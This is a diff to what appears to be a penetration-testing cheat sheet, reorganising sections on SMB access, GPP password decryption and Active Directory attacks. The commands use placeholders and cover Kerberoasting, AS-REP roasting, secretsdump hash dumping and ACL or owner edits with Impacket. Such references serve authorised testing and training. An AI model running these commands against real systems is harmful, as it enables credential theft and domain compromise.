@@ -62,6 +62,7 @@ Thank you for reading.
 		- [Python Webserver](#python-webserver)
 		- [RDP](#rdp)
 		- [showmount](#showmount)
+  		- [SMB](#smb)
 		- [smbclient](#smbclient)
 		- [socat](#socat)
 		- [SSH](#ssh)
@@ -109,7 +110,7 @@ Thank you for reading.
 	- [Password Attacks](#password-attacks-1)
 		- [CrackMapExec](#crackmapexec)
 		- [fcrack](#fcrack)
-  		- [gpp-decrypt](#gpp-decrypt)
+  		- [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
 		- [hashcat](#hashcat)
 		- [Hydra](#hydra)
 		- [John](#john)
@@ -777,20 +778,26 @@ sudo showmount -e <RHOST>
 chown root:root sid-shell; chmod +s sid-shell
 ```
 
+#### SMB
+
+```c
+mount.cifs //<RHOST>/<SHARE> /mnt/remote
+guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
+```
+
 #### smbclient
 
 ```c
 smbclient -L \\<RHOST>\ -N
 smbclient -L //<RHOST>/ -N
 smbclient -L ////<RHOST>/ -N
-smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
 smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
+smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
+smbclient //<RHOST>/<SHARE> -U <USERNAME>
 smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
 smbclient "\\\\<RHOST>\<SHARE>"
 smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
 smbclient --no-pass //<RHOST>/<SHARE>
-mount.cifs //<RHOST>/<SHARE> /mnt/remote
-guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
 ```
 
 ##### Download multiple files at once
@@ -800,14 +807,6 @@ mask""
 recurse ON
 prompt OFF
 mget *
-```
-
-##### Upload multiple Files at once
-
-```c
-recurse ON
-prompt OFF
-mput *
 ```
 
 #### socat
@@ -2351,7 +2350,9 @@ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wor
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
 ```
 
-## gpp-decrypt
+#### Group Policy Preferences (GPP)
+
+##### gpp-decrypt
 
 ```c
 python3 gpp-decrypt.py -f Groups.xml
@@ -2764,7 +2765,7 @@ meterpreter > download *
 
 ### Post Exploitation
 
-#### Abusing Account Operators Group Membership
+#### Account Operators Group Membership
 
 ##### Add User
 
@@ -3096,9 +3097,12 @@ impacket-smbserver local . -smb2support
 ##### impacket-smbclient
 
 ```c
+impacket-smbclient <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+```
+
+```c
 export KRB5CCNAME=<USERNAME>.ccache
-impacket-smbclient <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-impacket-smbclient -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass
+impacket-smbclient -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass
 ```
 
 ##### impacket-getTGT
@@ -3112,16 +3116,19 @@ impacket-getTGT <RHOST>/<USERNAME> -dc-ip <RHOST> -hashes aad3b435b51404eeaad3b4
 
 ```c
 impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
-impacket-GetNPUsers <DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>
 impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format john -outputfile hashes
+impacket-GetNPUsers <DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>
 ```
 
 ##### impacket-getUserSPNs
 
 ```c
 impacket-GetUserSPNs -request -dc-ip <RHOST> <DOMAIN>/<USERNAME>
+```
+
+```c
 export KRB5CCNAME=<USERNAME>.ccache
-impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<RHOST> -no-pass -request
+impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<DOMAIN> -no-pass -request
 ```
 
 ##### impacket-secretsdump
@@ -3131,6 +3138,9 @@ impacket-secretsdump <DOMAIN>/<USERNAME>@<RHOST>
 impacket-secretsdump -dc-ip <RHOST> <DOMAIN>/<SUERNAME>:<PASSWORD>@<RHOST>
 impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
 impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
+```
+
+```c
 export KRB5CCNAME=<USERNAME>.ccache
 impacket-secretsdump -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass -debug
 ```
@@ -3179,7 +3189,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 > https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py
 
 ```c
-$ python3 dacledit.py <DOMAIN>/<USERNAME>:<PASSWORD> -k -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' -dc-ip <RHOST> -action read -principal '<USERNAME>' -target '<GROUP>' -debug
+python3 dacledit.py <DOMAIN>/<USERNAME>:<PASSWORD> -k -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' -dc-ip <RHOST> -action read -principal '<USERNAME>' -target '<GROUP>' -debug
 ```
 
 ###### Fixing msada_guids Error
@@ -3198,7 +3208,7 @@ Then put the `msada_guids.py` into the same directory as `dacledit.py`
 > https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py
 
 ```c
-$ python3 owneredit.py -k '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <RHOST> -action write -new-owner '<USERNAME>' -target '<GROUP>' -debug
+python3 owneredit.py -k '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <RHOST> -action write -new-owner '<USERNAME>' -target '<GROUP>' -debug
 ```
 
 #### JAWS
